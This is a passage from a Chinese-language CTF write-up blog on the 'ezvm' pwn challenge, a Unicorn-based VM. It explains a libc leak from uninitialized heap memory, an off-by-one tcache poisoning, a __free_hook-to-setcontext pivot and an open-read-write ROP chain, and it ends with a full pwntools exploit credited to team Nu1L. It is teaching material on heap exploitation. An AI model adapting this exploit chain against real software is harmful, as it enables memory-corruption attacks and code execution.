<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ssize_t __fastcall sub_16C3(_QWORD *a1, const void *a2, size_t a3)<br>&#123;<br>  return write(*a1, a2, a3);<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">int __fastcall sub_166E(_QWORD *a1)<br>&#123;<br>  return close(*a1);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>如果inode编号是这三个，就不会调用malloc_xxx了。</p>
<h4 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h4><p>整个程序关键的函数只有上面这几个，我们目前只发现了一个在open中的漏洞。</p>
<p>首先我们能够溢出fd-&gt;malloc_buf，那么就能将对应地址释放，然后造成uaf。</p>
<p>首先我们需要泄露libc基址。因为用户是没办法和虚拟机直接交互的，并且unicorn中模拟的程序与我们有着完全不同的地址空间，因此我们想要泄露用户层的地址就只能依托，因此直接通过字节码来获取数据是行不通的，因为我们的数据和它们的数据在理论上是隔离的。</p>
<p>但有一个地方并没用隔离开，就是fd-&gt;malloc_buf，这个buf是从用户空间开辟出来的，里面会存有用户空间的数据。</p>
<blockquote>
<p>以下利用方式主要参考Nu1L战队给出的exp</p>
</blockquote>
<p>我们先试着随便放点可执行的机器码进去，然后看看此时的堆状态：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">x20 [  3]: 0x55d984671e70 —▸ 0x55d984671ec0 —▸ 0x55d984671ee0 ◂— 0x0<br>0x30 [  1]: 0x55d984671e90 ◂— 0x0<br>0x40 [  2]: 0x55d984671290 —▸ 0x55d98466cb80 ◂— 0x0<br>0x70 [  1]: 0x55d98466c540 ◂— 0x0<br>0xd0 [  2]: 0x55d98466fb50 —▸ 0x55d984663c60 ◂— 0x0<br>0x240 [  1]: 0x55d984671660 ◂— 0x0<br>0x310 [  2]: 0x55d98466fc20 —▸ 0x55d9846649e0 ◂— 0x0<br>0x390 [  1]: 0x55d9846712d0 ◂— 0x0<br>fastbins<br>0x20: 0x0<br>0x30: 0x0<br>0x40: 0x0<br>0x50: 0x0<br>0x60: 0x0<br>0x70: 0x0<br>0x80: 0x0<br>unsortedbin<br>all: 0x55d984694a20 —▸ 0x7ff43a2bebe0 (main_arena+96) ◂— 0x55d984694a20<br>smallbins<br>empty<br>largebins<br>0x1400: 0x55d9846743c0 —▸ 0x7ff43a2bf220 (main_arena+1696) ◂— 0x55d9846743c0<br></code></pre></td></tr></table></figure>

<p>注意到unsortedbin和largebins此时是有内容的，而开辟是使用malloc，不会清空内容。那么我们只要通过system_open让fd-&gt;malloc_buf从unsortedbin或largebins中开辟内容，然后用write将它们写出来，就泄露了libc地址。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#读入设备名<br>sc += sys_read(0,get_name(0),0x20)<br>#打开设备，让其从largebins中获取fd-&gt;malloc_buf的内存<br>sc += sys_open(get_name(0),0xb0)<br>#将fd-&gt;malloc_buf中残留的数据读出到缓冲区<br>sc += sys_read(3,get_name(1),0x100)<br>#将缓冲区的数据输出给用户<br>sc += sys_write(1,get_name(1),8)<br></code></pre></td></tr></table></figure>

<p>尽管现在泄露了地址，但利用却有些困难。Unicorn是以外部链接库的方式被调用的，我们不清楚它在执行过程中调用了多少malloc和free(除非我们真的去阅读源代码了，但似乎不太现实)，所以布置起来会有些麻烦。但还是有些特别的小技巧可用。</p>
<p>观察之前的堆状态我们可以知道，有个别几个Bin像是不被库调用的，比如size&#x3D;0x60&#x2F;0x80&#x2F;0xc0等，这些大小的chunk在Tcache bin中不存在，保守估计，我们能够找到一个完全由我们自己控制的大小块，这样就不需要担心因为调用库而被干扰了。</p>
<p>在上面泄露地址时：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sc += sys_open(get_name(0),0xb0)<br></code></pre></td></tr></table></figure>

<p>调用本行时，会申请0xc0大小的chunk，该chunk就很有可能不会被影响到。</p>
<p>接下来的思路是：</p>
<blockquote>
<p>首先关闭inode 3，将0xc0的chunk释放到tcache bin，然后通过off-by-one溢出到该chunk的上方，然后write该chunk去向下覆盖其fd指针，这样就能在之后开辟chunk到该fd。</p>
<p>我们可以让它是__free_hook，那么就能写成one_gadget或其他各种各样了(不过本题开启了沙箱，所以one_gadget不行，还是得老老实实orw拿出flag)。</p>
</blockquote>
<p>剩下的payload就不言而喻了，直接给出Nu1L师傅们的exp吧：(自己加了点注释)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>context.arch = &#x27;amd64&#x27;<br>context.log_level = &#x27;debug&#x27;<br>def read(fd,addr,size):<br>    sc = &#x27;&#x27;&#x27;<br>    xor eax,eax;<br>    push &#123;&#125;;<br>    pop rdi;<br>    mov rsi,&#123;&#125;;<br>    push &#123;&#125;;<br>    pop rdx;<br>    syscall;<br>    &#x27;&#x27;&#x27;.format(fd,addr,size)<br>    return sc<br>def write(fd,addr,size):<br>    sc = &#x27;&#x27;&#x27;<br>    push 1;<br>    pop rax;<br>    push &#123;&#125;;<br>    pop rdi;<br>    mov rsi,&#123;&#125;;<br>    push &#123;&#125;;<br>    pop rdx;<br>    syscall;<br>    &#x27;&#x27;&#x27;.format(fd,addr,size)<br>    return sc<br>def close(fd):<br>    sc = &#x27;&#x27;&#x27;<br>    push 3;<br>    pop rax;<br>    push &#123;&#125;;<br>    pop rdi;<br>    syscall;<br>    &#x27;&#x27;&#x27;.format(fd)<br>    return sc<br>def insert(name_addr,size):<br>    sc = &#x27;&#x27;&#x27;<br>    push 2;<br>    pop rax;<br>    mov rdi,&#123;&#125;;<br>    push &#123;&#125;;<br>    pop rsi;<br>    syscall;<br>    &#x27;&#x27;&#x27;.format(name_addr,size)<br>    return sc<br>def get_name(idx):<br>    return 0x7FFFFFFEF000+0x20*idx#a chunk size 0x20<br>def dbg(addr):<br>    gdb.attach(p,&#x27;b *$rebase(&#123;&#125;)\n&#x27;.format(addr))<br><br>p = process(&quot;./easyvm&quot;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libunicorn.so.1&#x27;&#125;)<br>elf=ELF(&quot;./easyvm&quot;)<br>libc=elf.libc<br>##---------PART 1---------##<br>sc = &#x27;&#x27;<br>sc += read(0,get_name(0),0x20)<br>sc += insert(get_name(0),0xb0)#3<br>sc += read(3,get_name(1),0x100)<br>sc += write(1,get_name(1),8)<br>sc += read(0,get_name(2),0x20)<br>sc += insert(get_name(2),0x100)#4<br>sc += read(0,get_name(3),0x20)<br>sc += insert(get_name(3),0xb0)#5<br><br>sc += read(0,get_name(4),0x300)<br>sc += close(5)<br>sc += close(3)<br><br>sc += write(4,get_name(4),0x38)<br>sc += insert(get_name(0),0xb0)<br>sc += insert(get_name(3),0xb8)<br>sc += write(5,get_name(4)+0x38,0xb8)<br>sc += &#x27;mov rdx,0x100;&#x27;<br>sc = asm(sc)<br>p.sendlineafter(&#x27;Send your code:&#x27;,sc)<br>##---------PART 2---------##<br>name = &#x27;/dev/a&#x27;<br>p.send(name)#open inode 3<br>libc_base=u64(p.recvuntil(&quot;\x7f&quot;)[-6:]+&#x27;\x00\x00&#x27;)-(0x7f42d70db1f0-0x7f42d6eef000)<br>print(hex(libc_base))<br>libc.address=libc_base<br>##---------PART 3---------##<br>p.send(&#x27;/dev/&#x27;.ljust(0x18,&#x27;b&#x27;))#off-by-one#open inode 4<br>p.send(&#x27;/dev/c&#x27;)#open inode 5<br><br>#free_hook--&gt;read--&gt;setcontext<br>#setcontext-&gt;&gt;read rop in bssrsp to bss<br>payload=p64(libc.address+0x0000000000154930)+p64(libc.sym[&#x27;__free_hook&#x27;]-0x10)+p64(libc.sym[&#x27;setcontext&#x27;]+61)<br>sig = SigreturnFrame()<br>sig.rsp = libc.bss(0x500)<br>sig.rip = libc.sym[&#x27;read&#x27;]<br>sig.rdi = 0<br>sig.rsi = libc.bss(0x500)<br>sig.rdx = 0x300<br>sig = str(sig)<br>payload += sig[0x28:]<br>p.send(&#x27;A&#x27;*0x28+p64(0x81)+p64(libc.sym[&#x27;__free_hook&#x27;])+payload)<br><br>##---------PART 4---------##<br>#create orw rop<br>pop_rdi = 0x0000000000026b72+libc.address<br>pop_rsi = 0x0000000000027529+libc.address<br>pop_rdx_r12 = 0x000000000011c371 + libc.address<br>payload = p64(pop_rdi)+p64(libc.bss(0x600))+p64(pop_rsi)+p64(0)+p64(libc.sym[&#x27;open&#x27;])<br>payload +=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(libc.bss(0x700))+p64(pop_rdx_r12)+p64(0x100)+p64(0)+p64(libc.sym[&#x27;read&#x27;])<br>payload +=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(libc.bss(0x700))+p64(pop_rdx_r12)+p64(0x100)+p64(0)+p64(libc.sym[&#x27;write&#x27;])<br>payload = payload.ljust(0x100)+&quot;./flag\x00&quot;<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<hr>
<p>插画ID：62506385</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/03/06/systemkernel-chapter14/">← Next 《操作系统真象还原》chapter14/文件系统与遗憾</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/02/11/systemkernel-chapter13/">《操作系统真象还原》chapter13 笔记与整理 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/6.png" alt="Logo"></a><h1 id="Dr"><a href="TokameinE">TokameinE</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/ErodedElk"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://space.bilibili.com/1782544616"><i class="fa-brands fa-bilibili" alt="BiliBili"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#RE"><span class="toc-number">1.</span> <span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tales-of-the-Arrow"><span class="toc-number">1.1.</span> <span class="toc-text">Tales of the Arrow</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">2.</span> <span class="toc-text">## PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unbelievable-write"><span class="toc-number">2.1.</span> <span class="toc-text">unbelievable_write</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nemu"><span class="toc-number">2.2.</span> <span class="toc-text">nemu</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90"><span class="toc-number">2.2.1.</span> <span class="toc-text">样本分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezvm"><span class="toc-number">2.3.</span> <span class="toc-text">ezvm</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#system-open"><span class="toc-number">2.3.1.</span> <span class="toc-text">system_open</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fd-write"><span class="toc-number">2.3.2.</span> <span class="toc-text">fd_write</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#system-read"><span class="toc-number">2.3.3.</span> <span class="toc-text">system_read</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#system-close"><span class="toc-number">2.3.4.</span> <span class="toc-text">system_close</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="toc-number">2.3.5.</span> <span class="toc-text">利用分析</span></a></li></ol></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>